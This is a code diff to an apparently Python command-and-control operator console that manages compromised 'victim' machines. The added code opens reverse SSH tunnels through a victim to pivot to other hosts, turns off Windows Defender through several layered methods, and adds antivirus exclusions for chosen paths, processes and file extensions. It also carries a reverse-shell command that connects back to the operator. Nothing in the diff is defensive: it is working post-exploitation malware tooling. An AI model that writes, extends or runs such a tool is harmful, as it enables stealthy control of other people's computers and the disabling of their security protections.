@@ -213,6 +213,11 @@ Commands:
   ssh list
   ssh disconnect <session_id>
 
+  --- PIVOT (reverse SSH tunnel via victim) ---
+  pivot open   <target_host> <target_port> <your_ssh_user> [password]
+  pivot stop   <session_id>
+  pivot list
+
   --- RDP ---
   rdp probe <host> [port]
   rdp open  <host> <user> [port] [password]
@@ -249,11 +254,18 @@ Commands:
 
   --- Reverse Shell ---
   shell <my_ip> [port=4445] [cmd.exe|powershell.exe]
-                                Open reverse shell: listener starts, DLL spawns shell
-                                and connects back, terminal enters raw pass-through mode
-                                Ctrl+] to detach (keeps shell alive on victim)
-  shell stop                    Terminate the shell process on the victim
-  shell status                  Check whether a shell is currently running
+                                Open reverse shell (Ctrl+] to detach)
+  shell stop / shell status
+
+  --- Windows Defender ---
+  defender status               Check service state, tamper protection, exclusions
+  defender disable              Disable Defender (5 layered methods, ~20 s, needs admin)
+  defender enable               Re-enable Defender and restore services
+  defender exclude path <path>  Add a path exclusion
+  defender exclude process <exe> Add a process exclusion
+  defender exclude ext <.ext>   Add a file-extension exclusion
+  defender unexclude path/process/ext <value>
+  defender exclusions           List all current exclusions
 
   --- Raw JSON (advanced) ---
   raw <module> <json_payload>
@@ -300,6 +312,35 @@ def parse_ssh(parts: list[str], client: C2Client):
         pprint(client.send("ssh", {"action": "disconnect", "session_id": parts[1]}))
     else:
         print(f"Unknown ssh action: {action!r}")
+
+
+def parse_pivot(parts: list[str], client: C2Client):
+    """Open/stop/list reverse SSH tunnels through the victim machine."""
+    if not parts:
+        print("Usage: pivot <open|stop|list> ...")
+        return
+    action = parts[0]
+    if action == "open":
+        if len(parts) < 4:
+            print("Usage: pivot open <target_host> <target_port> <your_ssh_user> [password]")
+            return
+        host     = parts[1]
+        port     = int(parts[2])
+        username = parts[3]
+        password = parts[4] if len(parts) > 4 else ""
+        payload  = {"action": "open", "host": host, "port": port,
+                    "username": username, "password": password,
+                    "session_id": f"{host}:{port}"}
+        pprint(client.send("pivot", payload))
+    elif action == "stop":
+        if len(parts) < 2:
+            print("Usage: pivot stop <session_id>")
+            return
+        pprint(client.send("pivot", {"action": "stop", "session_id": parts[1]}))
+    elif action == "list":
+        pprint(client.send("pivot", {"action": "list"}))
+    else:
+        print(f"Unknown pivot action: {action!r}. Valid: open, stop, list")
 
 
 def parse_rdp(parts: list[str], client: C2Client):
@@ -628,6 +669,67 @@ def parse_shell(parts: list[str], client: C2Client):
 
 
 # ──────────────────────────────────────────────────────────────────────
+# Windows Defender
+# ──────────────────────────────────────────────────────────────────────
+
+def parse_defender(parts: list[str], client: C2Client):
+    """Manage Windows Defender on the victim (requires admin on victim)."""
+    action = parts[0] if parts else "status"
+
+    if action == "status":
+        pprint(client.send("defender", {"action": "status"}))
+
+    elif action == "disable":
+        print(_c(YELLOW, "  Disabling Defender (5 layered methods) — may take ~20 s …"))
+        pprint(client.send("defender", {"action": "disable"}))
+
+    elif action == "enable":
+        print(_c(CYAN, "  Re-enabling Defender …"))
+        pprint(client.send("defender", {"action": "enable"}))
+
+    elif action in ("exclude", "add_exclusion"):
+        # defender exclude path <p> | process <proc> | ext <.ext>
+        if len(parts) < 3:
+            print("Usage: defender exclude path <path>")
+            print("       defender exclude process <exe>")
+            print("       defender exclude ext <.ext>")
+            return
+        payload = {"action": "add_exclusion"}
+        kind, value = parts[1], " ".join(parts[2:])
+        if kind == "path":    payload["path"]      = value
+        elif kind == "process": payload["process"] = value
+        elif kind == "ext":   payload["extension"] = value
+        else:
+            print(f"Unknown exclusion type: {kind!r}. Use: path | process | ext")
+            return
+        pprint(client.send("defender", payload))
+
+    elif action in ("unexclude", "remove_exclusion"):
+        if len(parts) < 3:
+            print("Usage: defender unexclude path <path>")
+            print("       defender unexclude process <exe>")
+            return
+        payload = {"action": "remove_exclusion"}
+        kind, value = parts[1], " ".join(parts[2:])
+        if kind == "path":    payload["path"]      = value
+        elif kind == "process": payload["process"] = value
+        elif kind == "ext":   payload["extension"] = value
+        else:
+            print(f"Unknown exclusion type: {kind!r}")
+            return
+        pprint(client.send("defender", payload))
+
+    elif action in ("exclusions", "list_exclusions"):
+        pprint(client.send("defender", {"action": "list_exclusions"}))
+
+    else:
+        print(f"Unknown defender action: {action!r}")
+        print("Usage: defender status | disable | enable | "
+              "exclude <path|process|ext> <value> | "
+              "unexclude <path|process|ext> <value> | exclusions")
+
+
+# ──────────────────────────────────────────────────────────────────────
 # REPL
 # ──────────────────────────────────────────────────────────────────────
 
@@ -658,6 +760,8 @@ def repl(client: C2Client):
             print(HELP_TEXT)
         elif cmd == "ssh":
             parse_ssh(parts[1:], client)
+        elif cmd == "pivot":
+            parse_pivot(parts[1:], client)
         elif cmd == "rdp":
             parse_rdp(parts[1:], client)
         elif cmd == "reg":
@@ -668,6 +772,8 @@ def repl(client: C2Client):
             parse_notify(parts[1:], client)
         elif cmd == "shell":
             parse_shell(parts[1:], client)
+        elif cmd == "defender":
+            parse_defender(parts[1:], client)
         elif cmd == "raw":
             if len(parts) < 3:
                 print("Usage: raw <module> <json_payload>")
